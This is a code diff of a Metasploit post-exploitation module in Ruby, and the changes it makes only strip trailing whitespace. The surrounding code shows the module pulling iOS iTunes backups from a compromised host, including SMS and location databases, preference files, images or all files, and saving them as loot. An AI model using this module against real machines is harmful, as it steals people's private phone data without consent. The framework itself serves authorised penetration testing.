@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Post
 				OptBool.new('DATABASES',  [false, 'Collect all database files? (SMS, Location, etc)', true]),
 				OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),
 				OptBool.new('IMAGES', [false, 'Collect all image files?', false]),
-				OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])				
+				OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])
 			], self.class)
 	end
 
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Post
 			print_error "Unsupported platform #{session.platform}"
 			return
 		end
-		
+
 		if paths.empty?
 			print_status("No users found with an iTunes backup directory")
 			return
@@ -157,14 +157,14 @@ class Metasploit3 < Msf::Post
 	def process_backups(paths)
 		paths.each {|path| process_backup(path) }
 	end
-	
+
 	def process_backup(path)
 
 		print_status("Pulling data from #{path}...")
-		
+
 		mbdb_data = ""
 		mbdx_data = ""
-		
+
 		print_status("Reading Manifest.mbdb from #{path}...")
 		if session.type == "shell"
 			mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
@@ -186,25 +186,25 @@ class Metasploit3 < Msf::Post
 			end
 			mfd.close
 		end
-		
+
 		manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data, mbdx_data)
-		
+
 		patterns = []
 		patterns << /\.db$/i if datastore['DATABASES']
 		patterns << /\.plist$/i if datastore['PLISTS']
 		patterns << /\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']
 		patterns << /.*/ if datastore['EVERYTHING']
-		
-		done = {}		
-		patterns.each do |pat|	
+
+		done = {}
+		patterns.each do |pat|
 			manifest.entries.each_pair do |fname, info|
 				next if done[fname]
 				next if not info[:filename].to_s =~ pat
-				
+
 				print_status("Downloading #{info[:domain]} #{info[:filename]}...")
 
 				begin
-				
+
 				fdata = ""
 				if session.type == "shell"
 					fdata = session.shell_command("cat #{path}/#{fname}")
@@ -217,17 +217,17 @@ class Metasploit3 < Msf::Post
 				end
 				bname = info[:filename] || "unknown.bin"
 				rname = info[:domain].to_s + "_" + bname
-				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")			
+				rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
 				ctype = "application/octet-stream"
-				
+
 				store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
-				
+
 				rescue ::Interrupt
 					raise $!
 				rescue ::Exception => e
 					print_error("Failed to download #{fname}: #{e.class} #{e}")
 				end
-				
+
 				done[fname] = true
 			end
 		end
